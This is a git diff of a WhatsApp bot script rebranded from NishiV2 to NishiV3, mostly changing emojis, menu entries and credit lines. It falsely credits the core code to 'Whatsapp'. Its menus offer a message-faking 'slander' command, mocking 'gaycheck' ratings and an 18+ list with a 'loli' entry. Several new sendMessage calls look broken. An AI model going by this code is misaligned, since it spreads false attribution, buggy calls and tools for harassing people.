@@ -1,4 +1,4 @@
-//-----(Doge Bot Core Skrypt by Xeon.)-----\\
+//-----(Nishi Bot Core Skrypt by Whatsapp.)-----\\
 //-----(Modified and ReBuilt By Nischal)-----\\
 //-----(Whatsapp number: +918919822103)-----\\
 //-----(Wanna reupload??? Can, but give proper credit)----\\
@@ -289,7 +289,7 @@ try {
 		gambarrr = fs.readFileSync('./thumb.jpg')
 		cmhit.push(command)
         mess = {
-			wait: 'Wait a minute',
+			wait: 'Sorr Way A Sec',
 			success: 'Success',
 			error: {
 				stick: 'Cannot access videos!',
@@ -337,11 +337,11 @@ return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a
 }
 		if (antibot === true) return
 		const katalog = (teks) => {
-             res = alpha.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*NishiV2•Powered By Xeon*", "thumbnail": ftex, "surface": 'CATALOG' }}, {quoted:ftex})
+             res = alpha.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*NishiV3•Powered By Whatsapp*", "thumbnail": ftex, "surface": 'CATALOG' }}, {quoted:ftex})
              alpha.relayWAMessage(res)
         }
         const grupinv = (teks) => {
-        	grup = alpha.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/HEiSfugQ3A2AA3ZjLnhMSO', "groupName": `©Nishi-Official™✨.`, "footerText": "*NishiV2•Powered By Xeon*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
+        	grup = alpha.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/HEiSfugQ3A2AA3ZjLnhMSO', "groupName": `©Nishi-Official™✨.`, "footerText": "*NishiV3•Powered By Whatsapp*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
             alpha.relayWAMessage(grup)
         }
 		idttt = []
@@ -370,30 +370,30 @@ return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a
 			var ase = new Date();
                         var jamss = ase.getHours();
                          switch(jamss){
-                case 0: jamss = "NishiV2"; break;
-                case 1: jamss = "NishiV2"; break;
-                case 2: jamss = "NishiV2"; break;
-                case 3: jamss = "NishiV2"; break;
-                case 4: jamss = "NishiV2"; break;
-                case 5: jamss = "NishiV2"; break;
-                case 6: jamss = "NishiV2"; break;
-                case 7: jamss = "NishiV2"; break;
-                case 8: jamss = "NishiV2"; break;
-                case 9: jamss = "NishiV2"; break;
-                case 10: jamss = "NishiV2"; break;
-                case 11: jamss = "NishiV2"; break;
-                case 12: jamss = "NishiV2"; break;
-                case 13: jamss = "NishiV2"; break;
-                case 14: jamss = "NishiV2"; break;
-                case 15: jamss = "NishiV2"; break;
-                case 16: jamss = "NishiV2"; break;
-                case 17: jamss = "NishiV2"; break;
-                case 18: jamss = "NishiV2"; break;
-                case 19: jamss = "NishiV2"; break;
-                case 20: jamss = "NishiV2"; break;
-                case 21: jamss = "NishiV2"; break;
-                case 22: jamss = "NishiV2"; break;
-                case 23: jamss = "NishiV2"; break;
+                case 0: jamss = "NishiV3"; break;
+                case 1: jamss = "NishiV3"; break;
+                case 2: jamss = "NishiV3"; break;
+                case 3: jamss = "NishiV3"; break;
+                case 4: jamss = "NishiV3"; break;
+                case 5: jamss = "NishiV3"; break;
+                case 6: jamss = "NishiV3"; break;
+                case 7: jamss = "NishiV3"; break;
+                case 8: jamss = "NishiV3"; break;
+                case 9: jamss = "NishiV3"; break;
+                case 10: jamss = "NishiV3"; break;
+                case 11: jamss = "NishiV3"; break;
+                case 12: jamss = "NishiV3"; break;
+                case 13: jamss = "NishiV3"; break;
+                case 14: jamss = "NishiV3"; break;
+                case 15: jamss = "NishiV3"; break;
+                case 16: jamss = "NishiV3"; break;
+                case 17: jamss = "NishiV3"; break;
+                case 18: jamss = "NishiV3"; break;
+                case 19: jamss = "NishiV3"; break;
+                case 20: jamss = "NishiV3"; break;
+                case 21: jamss = "NishiV3"; break;
+                case 22: jamss = "NishiV3"; break;
+                case 23: jamss = "NishiV3"; break;
             }
             var tampilUcapan = "" + jamss;
             const jmn = moment.tz('Asia/Jakarta').format('HH.mm')
@@ -640,9 +640,9 @@ options
 );
 };
 
-const daftar1 = `*Hi ${pushname}* 👋\n*Please Verify First*`
-const daftar2 = '_Click the button below to verify if You cant see A button Type !verify _'
-const daftar3 = [{buttonId: `verify`,buttonText: {displayText: `🤤VERIFY🤤`,},type: 1,},]
+const daftar1 = `*Supp Hoomun ${pushname}* 👋\n*Please Verify First*`
+const daftar2 = '_Click the button below to verify\nif You cant see A button Type !verify _'
+const daftar3 = [{buttonId: `verify`,buttonText: {displayText: `☠️VERIFY☠️`,},type: 1,},]
 
 const createSerial = (size) => {
 return crypto.randomBytes(size).toString('hex').slice(0, size)
@@ -716,7 +716,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
             if (isAfk(mek.key.remoteJid)) return
             addafk(mek.key.remoteJid)
 			heheh = ms(Date.now() - waktuafk)
-		  sendButMessage(from, `Hi ${pushname}, Sorry it seems at this time ${NamaOwner} is offline\n\n*Reason :* ${alasanafk}\n*Since :* ${heheh.hours} Hour, ${heheh.minutes} Minute, ${heheh.seconds} Second\n\nPlease contact again after Online`, "*NishiV2*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftex, contextInfo: { forwardingScore: 508, isForwarded: true}})
+		  sendButMessage(from, `Hi ${pushname}, Sorry it seems at this time ${NamaOwner} is offline\n\n*Reason :* ${alasanafk}\n*Since :* ${heheh.hours} Hour, ${heheh.minutes} Minute, ${heheh.seconds} Second\n\nPlease contact again after Online`, "*NishiV3*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftex, contextInfo: { forwardingScore: 508, isForwarded: true}})
 			}
 		}
 		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
@@ -729,7 +729,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
                         if (isAfk(mek.key.remoteJid)) return
                         addafk(mek.key.remoteJid)
 						heheh = ms(Date.now() - waktuafk)
-			       sendButMessage(from, `Hi ${pushname}, Sorry it seems at this time ${NamaOwner} is offline\n\n*Reason :* ${alasanafk}\n*Since :* ${heheh.hours} Hour, ${heheh.minutes} Minute, ${heheh.seconds} Second\n\nPlease contact again after Online`, "*NishiV2*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftex, contextInfo: { forwardingScore: 508, isForwarded: true}})
+			       sendButMessage(from, `Hi ${pushname}, Sorry it seems at this time ${NamaOwner} is offline\n\n*Reason :* ${alasanafk}\n*Since :* ${heheh.hours} Hour, ${heheh.minutes} Minute, ${heheh.seconds} Second\n\nPlease contact again after Online`, "*NishiV3*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftex, contextInfo: { forwardingScore: 508, isForwarded: true}})
 					}
 				}
 						}
@@ -779,7 +779,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
                 });
             }
             const sendKontak = (from, nomor, nama) => {
-	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:NishiV2 Owner\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
+	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:NishiV3 Owner\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
 	        alpha.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
             }
             const hideTagKontak = async function(from, nomor, nama){
@@ -793,7 +793,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
 	        alpha.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
             }
 		const reply = (teks) => {
-			alpha.sendMessage(from, teks, text, { thumbnail: ofrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `NishiV2`,body:"HORNY = BONK",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/p/6349482305092740/918919822103`}}})
+			alpha.sendMessage(from, teks, text, { thumbnail: ofrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `NishiV3`,body:"HORNY = BONK",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/p/6349482305092740/918919822103`}}})
 		}
 		const simir = (teks) => {
 			alpha.sendMessage(from, teks, text, { quoted:ftex })
@@ -806,24 +806,28 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
 		}
 		//>>>>>>>>STICKER<<<<<<<\\
 		const sticOwner = (hehe) => {
-			ano = fs.readFileSync('./sticker/anime/owner.webp')
-			alpha.sendMessage(hehe, ano, sticker, { quoted: mek})
+			// ano = fs.readFileSync('./sticker/anime/owner.webp')
+			alpha.sendMessage("You No My Master!!👿")
 		}
 		const sticNotAdmin = (hehe) => {
-			ano = fs.readFileSync('./sticker/anime/notadmin.webp')
-			alpha.sendMessage(hehe, ano, sticker, { quoted: mek})
+			// ano = fs.readFileSync('./sticker/anime/notadmin.webp')
+			// alpha.sendMessage(hehe, ano, sticker, { quoted: mek})
+			alpha.sendMessage("Ayo Admin me First!!")
 		}
 		const sticAdmin = (hehe) => {
-			ano = fs.readFileSync('./sticker/anime/admin.webp')
-			alpha.sendMessage(hehe, ano, sticker, { quoted: mek})
+			// ano = fs.readFileSync('./sticker/anime/admin.webp')
+			// alpha.sendMessage(hehe, ano, sticker, { quoted: mek})
+			alpha.sendMessage("Only Admins can use this!! and you not one")
 		}
 		const sticWait = (hehe) => {
-			ano = fs.readFileSync('./sticker/anime/wait.webp')
-			alpha.sendMessage(hehe, ano, sticker, { quoted: mek})
+			// ano = fs.readFileSync('./sticker/anime/wait.webp')
+			// alpha.sendMessage(hehe, ano, sticker, { quoted: mek})
+			alpha.sendMessage("Aight bro On It Wait a Minute!")
 		}
 		const sticOk = (hehe) => {
-			ano = fs.readFileSync('./sticker/anime/ok.webp')
-			alpha.sendMessage(hehe, ano, sticker, { quoted: mek})
+			// ano = fs.readFileSync('./sticker/anime/ok.webp')
+			// alpha.sendMessage(hehe, ano, sticker, { quoted: mek})
+			alpha.sendMessage("OK;)!")
 		}
 		const mentions = (teks, memberr, id) => {
 			(id == null || id == undefined || id == false) ? alpha.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
@@ -1116,10 +1120,10 @@ if (!settings.autoread) {
 alpha.chatRead(from)
 }
 if (budy.startsWith('bot')){
-sendButMessage(from, `${JSON.stringify(me, null, 2)}`, "*NishiV2*", [{buttonId: 'igm', buttonText: {displayText: 'Github'}, type: 1},{buttonId: 'ytm', buttonText: {displayText: 'YouTube'}, type: 1}], {quoted:ftex, contextInfo: { forwardingScore: 508, isForwarded: true}})
+sendButMessage(from, `${JSON.stringify(me, null, 2)}`, "*NishiV3*", [{buttonId: 'igm', buttonText: {displayText: 'Github'}, type: 1},{buttonId: 'ytm', buttonText: {displayText: 'YouTube'}, type: 1}], {quoted:ftex, contextInfo: { forwardingScore: 508, isForwarded: true}})
 }
 if(isButton == 'igm'){
-reply('https://github.com/1amNischal')
+reply('https://github.com/NischalRapiReddy/')
 }
 if(isButton == 'ytm'){
 reply('https://www.youtube.com/channel/UCJDdKz7FcRpwb-bjSmeLPaw')
@@ -1217,20 +1221,20 @@ tod = `┏━━━━━━━━━━━━━━━━━━━━
 ⬡ ${z}My Masters Number ${NomorOwner}${z}
 ┗━━━━━━━━━━━━━━━━━━`
 tod2 =`┏━━━❒ *MENU LIST*
-${z}🤤 ${prefix}soundmenu${z}
-${z}🤤 ${prefix}rentbot${z}
-${z}🤤 ${prefix}status${z}
-${z}🤤 ${prefix}intakemenu${z}
-${z}🤤 ${prefix}runtime${z}
-${z}🤤 ${prefix}makermenu${z}
-${z}🤤 ${prefix}ownermenu${z}
-${z}🤤 ${prefix}groupmenu${z}
-${z}🤤 ${prefix}othermenu${z}
-${z}🤤 ${prefix}downloadmenu${z}
-${z}🤤 ${prefix}funmenu${z}
-${z}🤤 ${prefix}nsfwmenu${z}
-${z}🤤 ${prefix}animemenu${z}
-    To Install This Bot On Your Whatsapp For Free Contact: ${NomorOwner}${z}
+${z}☠️ ${prefix}soundmenu${z}
+${z}☠️ ${prefix}rentbot${z}
+${z}☠️ ${prefix}status${z}
+${z}☠️ ${prefix}intakemenu${z}
+${z}☠️ ${prefix}runtime${z}
+${z}☠️ ${prefix}makermenu${z}
+${z}☠️ ${prefix}ownermenu${z}
+${z}☠️ ${prefix}groupmenu${z}
+${z}☠️ ${prefix}othermenu${z}
+${z}☠️ ${prefix}downloadmenu${z}
+${z}☠️ ${prefix}funmenu${z}
+${z}☠️ ${prefix}nsfwmenu${z}
+${z}☠️ ${prefix}animemenu${z}
+    To Buy This Bot And Install On Your Number Contact: ${NomorOwner}${z}
 ┗━━━━━━━━━━━━━━━━━`
 buttons = [
 {buttonId:`scbot`, buttonText: {displayText: 'YO BOI🔖'}, type: 1},
@@ -1305,9 +1309,9 @@ case 'stupid':
         membr.push(goo.jid)
         mentions(teks, membr, true)
         break
-        //funmenu by xeon
+        //funmenu by Nischal
                         case 'uglycheck':
-					// source code by xeon⛔
+					// source code by Nischal⛔
 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
                   sange = body.slice(1)
 					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
@@ -1315,7 +1319,7 @@ if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quo
 					alpha.sendMessage(from, 'Question : *'+sange+'*\n\nAnswer: '+ nge+'%', text, { quoted: mek })
 					break
                 case 'gaycheck':
-					// source code by xeon⛔
+					// source code by Nischal⛔
 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
                   gayy = body.slice(1)
 					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
@@ -1324,7 +1328,7 @@ if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quo
 					break
                 case 'lesbicheck':
                 case 'lesbiancheck':
-					// source code by xeon⛔
+					// source code by ⛔
 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
                   lesbii = body.slice(1)
 					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
@@ -1332,7 +1336,7 @@ if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quo
 					alpha.sendMessage(from, 'Question : *'+lesbii+'*\n\nAnswer : '+ bi+'%', text, { quoted: mek })
 					break
                 case 'handsomecheck':
-					// source code by xeon⛔
+					// source code by Nischal⛔
 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
 ganteng = body.slice(1)
 					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
@@ -1340,7 +1344,7 @@ ganteng = body.slice(1)
 					alpha.sendMessage(from, 'Question : *'+ganteng+'*\n\nAnswer : '+ teng+'%', text, { quoted: mek })
 					break
 		case 'beautycheck':
-					// source code by xeon⛔
+					// source code by Nischal⛔
 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
 cantik = body.slice(1)
 					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
@@ -1348,7 +1352,7 @@ cantik = body.slice(1)
 					alpha.sendMessage(from, 'Question : *'+cantik+'*\n\nAnswer : '+ tik+'%', text, { quoted: mek })
 					break
 		case 'charactercheck':
-					// source code by xeon⛔
+					// source code by Nischal⛔
 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
 watak = body.slice(1)
 					const wa =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
@@ -1482,39 +1486,39 @@ case 'funmenu':
 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
 stamtus = `❏ 「 \`\`\`FUN MENU\`\`\` 」
 ────────────────────
-🤤 ${prefix}stupid
-🤤 ${prefix}foolish
-🤤 ${prefix}smart
-🤤 ${prefix}handsome
-🤤 ${prefix}beautiful
-🤤 ${prefix}gay
-🤤 ${prefix}lesbi
-🤤 ${prefix}bastard
-🤤 ${prefix}stubble
-🤤 ${prefix}dog
-🤤 ${prefix}fuck
-🤤 ${prefix}ugly
-🤤 ${prefix}ape
-🤤 ${prefix}cute
-🤤 ${prefix}noob
-🤤 ${prefix}kind
-🤤 ${prefix}great
-🤤 ${prefix}horny
-🤤 ${prefix}wibu
-🤤 ${prefix}asshole
-🤤 ${prefix}truth
-🤤 ${prefix}dare
-🤤 ${prefix}tod
-🤤 ${prefix}couple
-🤤 ${prefix}ship [tag1|tag2]
-🤤 ${prefix}handsomecheck [tag]
-🤤 ${prefix}beautycheck [tag]
-🤤 ${prefix}gaycheck [tag]
-🤤 ${prefix}lesbiancheck [tag]
-🤤 ${prefix}charactercheck [tag]
-🤤 ${prefix}is [text]
-🤤 ${prefix}when [text]
-🤤 ${prefix}can [text]
+☠️ ${prefix}stupid
+☠️ ${prefix}foolish
+☠️ ${prefix}smart
+☠️ ${prefix}handsome
+☠️ ${prefix}beautiful
+☠️ ${prefix}gay
+☠️ ${prefix}lesbi
+☠️ ${prefix}bastard
+☠️ ${prefix}stubble
+☠️ ${prefix}dog
+☠️ ${prefix}fuck
+☠️ ${prefix}ugly
+☠️ ${prefix}ape
+☠️ ${prefix}cute
+☠️ ${prefix}noob
+☠️ ${prefix}kind
+☠️ ${prefix}great
+☠️ ${prefix}horny
+☠️ ${prefix}wibu
+☠️ ${prefix}asshole
+☠️ ${prefix}truth
+☠️ ${prefix}dare
+☠️ ${prefix}tod
+☠️ ${prefix}couple
+☠️ ${prefix}ship [tag1|tag2]
+☠️ ${prefix}handsomecheck [tag]
+☠️ ${prefix}beautycheck [tag]
+☠️ ${prefix}gaycheck [tag]
+☠️ ${prefix}lesbiancheck [tag]
+☠️ ${prefix}charactercheck [tag]
+☠️ ${prefix}is [text]
+☠️ ${prefix}when [text]
+☠️ ${prefix}can [text]
 ────────────────────`
 buttons = [
 {buttonId:`sc`,buttonText:{displayText: 'BOT SCRIPT🔖'},type:1},
@@ -1522,7 +1526,7 @@ buttons = [
 ]
 const grup = {
     contentText: `${stamtus}`,
-    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Xeon_`,
+    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Whatsapp_`,
     buttons: buttons,
     headerType: 1
 }
@@ -1532,39 +1536,39 @@ case 'groupmenu':
 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
 stamtus = `❏ 「 \`\`\`GROUP MENU\`\`\` 」
 ────────────────────
-🤤 ${prefix}getpict [ @tag ]
-🤤 ${prefix}getname [ reply target ]
-🤤 ${prefix}getbio [ reply target ]
-🤤 ${prefix}promote [ @tag ]
-🤤 ${prefix}demote [ @tag ]
-🤤 ${prefix}antilink [ on/off ]
-🤤 ${prefix}antivirtex [ on/off ]
-🤤 ${prefix}antiwame [ on/off ]
-🤤 ${prefix}antibug [ on/off ]
-🤤 ${prefix}creategrup [ name|@tag ]
-🤤 ${prefix}tictactoe [ @tag ]
-🤤 ${prefix}nsfw [1/0]
-🤤 ${prefix}delttt
-🤤 ${prefix}getpp
-🤤 ${prefix}getdescgc
-🤤 ${prefix}sider [ reply to bot messages ]
-🤤 ${prefix}hacked [text]
-🤤 ${prefix}setnamegc [text]
-🤤 ${prefix}setdescgc [*text]
-🤤 ${prefix}slander [ @tag|text1|text2 ]
-🤤 ${prefix}contag [number|name]
-🤤 ${prefix}scontact [ @tag|name ]
-🤤 ${prefix}autojoin
-🤤 ${prefix}join [group link]
-🤤 ${prefix}opengc
-🤤 ${prefix}closegc
-🤤 ${prefix}resetgclink
-🤤 ${prefix}grouplink
-🤤 ${prefix}hidetag [text]
-🤤 ${prefix}sticktag [ sticker name ]
-🤤 ${prefix}totag [ reply media ]
-🤤 ${prefix}tagall
-🤤 ${prefix}tagsomeone [number]
+☠️ ${prefix}getpict [ @tag ]
+☠️ ${prefix}getname [ reply target ]
+☠️ ${prefix}getbio [ reply target ]
+☠️ ${prefix}promote [ @tag ]
+☠️ ${prefix}demote [ @tag ]
+☠️ ${prefix}antilink [ on/off ]
+☠️ ${prefix}antivirtex [ on/off ]
+☠️ ${prefix}antiwame [ on/off ]
+☠️ ${prefix}antibug [ on/off ]
+☠️ ${prefix}creategrup [ name|@tag ]
+☠️ ${prefix}tictactoe [ @tag ]
+☠️ ${prefix}nsfw [1/0]
+☠️ ${prefix}delttt
+☠️ ${prefix}getpp
+☠️ ${prefix}getdescgc
+☠️ ${prefix}sider [ reply to bot messages ]
+☠️ ${prefix}hacked [text]
+☠️ ${prefix}setnamegc [text]
+☠️ ${prefix}setdescgc [*text]
+☠️ ${prefix}slander [ @tag|text1|text2 ]
+☠️ ${prefix}contag [number|name]
+☠️ ${prefix}scontact [ @tag|name ]
+☠️ ${prefix}autojoin
+☠️ ${prefix}join [group link]
+☠️ ${prefix}opengc
+☠️ ${prefix}closegc
+☠️ ${prefix}resetgclink
+☠️ ${prefix}grouplink
+☠️ ${prefix}hidetag [text]
+☠️ ${prefix}sticktag [ sticker name ]
+☠️ ${prefix}totag [ reply media ]
+☠️ ${prefix}tagall
+☠️ ${prefix}tagsomeone [number]
 ────────────────────`
 buttons = [
 {buttonId:`sc`,buttonText:{displayText: 'Yo Boi'},type:1},
@@ -1572,7 +1576,7 @@ buttons = [
 ]
 const funyo = {
     contentText: `${stamtus}`,
-    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Xeon_`,
+    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Whatsapp_`,
     buttons: buttons,
     headerType: 1
 }
@@ -1612,38 +1616,26 @@ case 'listmenu':
  description: `_*Yo Boi, Choose The Menu from The list Below!*_`,
  sections: [
                      {
-                      "title": `NishiV2`,
+                      "title": `🤖NishiV3🤖`,
  rows: [
-                          {
-                              "title": "SellBot",
-															"description": "🤑Buy The Bot💵",
-                              "rowId": ""
-                           },
-                           {
-                              "title": "Speed",
-															"description": "⚡Speed Of The Bot⚡",
-                              "rowId": ""
-                           },
+                          
+                           
                            // {
                            //    "title": "SoundMenu",
 														// 	"description": "🎶Prebuilt Sounds",
                            //    "rowId": ""
                            // },
+                           
                            {
-                              "title": "Status",
-															"description": "🎂Janam KundalI Of The Bot",
+                              "title": "🤘Creator",
+															"description": "👻ReBuilt By Nischal•Powered By Whatsapp",
                               "rowId": ""
                            },
-                           {
-                              "title": "Creator",
-															"description": "👻ReBuilt By Nischal•Powered By Xeon",
-                              "rowId": ""
-                           },
-                           {
-                              "title": "RentBot",
-															"description": "🧧Rent This Bot",
-                              "rowId": ""
-                            },
+                          //  {
+                          //     "title": "✨RentBot",
+													// 		"description": "🧧Rent This Bot",
+                          //     "rowId": ""
+                          //   },
                            {
                               "title": "IntakeMenu",
 															"description": "🎈This is Some Fun",
@@ -1651,13 +1643,18 @@ case 'listmenu':
                            },
                            {
                               "title": "Runtime",
-															"description": "Nishi-Bot V2 Made with <3 By Nischal",
+															"description": "🤖 Nishi-Bot V3 Made with <3 By Nischal",
                               "rowId": ""
                            },
                            {
                               "title": "OwnerMenu",
-															"description": "Core Code By Xeon",
+															"description": "Core Code By Whatsapp",
                               "rowId": ""
+                           },
+                           {
+                            "title": "DownloadMenu",
+                            "description": "⬇️HomeMade Downloader for most of the platforms",
+                            "rowId": ""
                            },
                            {
                               "title": "MakerMenu",
@@ -1681,12 +1678,22 @@ case 'listmenu':
                            },
                            {
                               "title": "OtherMenu",
-															"description": "🧠Interesting Menu",
+							                "description": "🧠Interesting Menu",
                               "rowId": ""
                            },
                            {
-                              "title": "DownloadMenu",
-															"description": "⬇️HomeMade Downloader for most of the platforms",
+                            "title": "Speed",
+                            "description": "⚡Speed Of The Bot⚡",
+                            "rowId": ""
+                           },
+                           {
+                            "title": "Status",
+                            "description": "🎂Janam Kundali Of The Bot",
+                            "rowId": ""
+                           },
+                           {
+                              "title": "SellBot",
+															"description": "🤑Buy The Bot💵",
                               "rowId": ""
                            }
                         ]
@@ -1699,12 +1706,12 @@ case 'nsfwmenu':
 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
 stamtus = `❏ 「 \`\`\`18+ MENU\`\`\` 」
 ────────────────────
-🤤 ${prefix}hentai
-🤤 ${prefix}blowjob
-🤤 ${prefix}awoo
-🤤 ${prefix}neko
-🤤 ${prefix}megumin2
-🤤 ${prefix}trapnime
+☠️ ${prefix}hentai
+☠️ ${prefix}blowjob
+☠️ ${prefix}awoo
+☠️ ${prefix}neko
+☠️ ${prefix}megumin2
+☠️ ${prefix}trapnime
 ────────────────────`
 buttons = [
 {buttonId:`sc`,buttonText:{displayText: 'Yo Boi'},type:1},
@@ -1712,7 +1719,7 @@ buttons = [
 ]
 const funn = {
     contentText: `${stamtus}`,
-    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Xeon_`,
+    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Whatsapp_`,
     buttons: buttons,
     headerType: 1
 }
@@ -1722,20 +1729,20 @@ await alpha.sendMessage(from, funn, MessageType.buttonsMessage, {quoted: ftex})
 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
 stamtus = `❏ 「 \`\`\`18+ MENU\`\`\` 」
 ────────────────────
-🤤 ${prefix}waifu
-🤤 ${prefix}loli
-🤤 ${prefix}husbu
-🤤 ${prefix}milf
-🤤 ${prefix}cosplay
-🤤 ${prefix}wallml
+☠️ ${prefix}waifu
+☠️ ${prefix}loli
+☠️ ${prefix}husbu
+☠️ ${prefix}milf
+☠️ ${prefix}cosplay
+☠️ ${prefix}wallml
 ────────────────────`
 buttons = [
 {buttonId:`sc`,buttonText:{displayText: 'ReCoder Nischal'},type:1},
-{buttonId:`owner`, buttonText: {displayText: 'Powered By Xeon'}, type: 1}
+{buttonId:`owner`, buttonText: {displayText: 'Powered By Whatsapp'}, type: 1}
 ]
 const animerandomx = {
     contentText: `${stamtus}`,
-    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Xeon_`,
+    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Whatsapp_`,
     buttons: buttons,
     headerType: 1
 }
@@ -1744,13 +1751,13 @@ await alpha.sendMessage(from, animerandomx, MessageType.buttonsMessage, {quoted:
 case 'soundmenu':
 stamtus =`❏ 「 \`\`\`SOUND MENU\`\`\` 」
 ────────────────────
-🤤 ${prefix}This
-🤤 ${prefix}FEATURE
-🤤 ${prefix}Is
-🤤 ${prefix}Useless
-🤤 ${prefix}Literally 
-🤤 ${prefix}Trust
-🤤 ${prefix}Me
+☠️ ${prefix}This
+☠️ ${prefix}FEATURE
+☠️ ${prefix}Is
+☠️ ${prefix}Useless
+☠️ ${prefix}Literally 
+☠️ ${prefix}Trust
+☠️ ${prefix}Me
 
 [ Made with <3 By Nischal.. ]
 ────────────────────`
@@ -1760,74 +1767,75 @@ buttons = [
 ]
 const soundM = {
     contentText: `${stamtus}`,
-    footerText: `_Powered By Xeon•ReMade By Nischal_`,
+    footerText: `_Powered By Whatsapp•ReMade By Nischal_`,
     buttons: buttons,
     headerType: 1
 }
 await alpha.sendMessage(from, soundM, MessageType.buttonsMessage, {quoted: ftex})
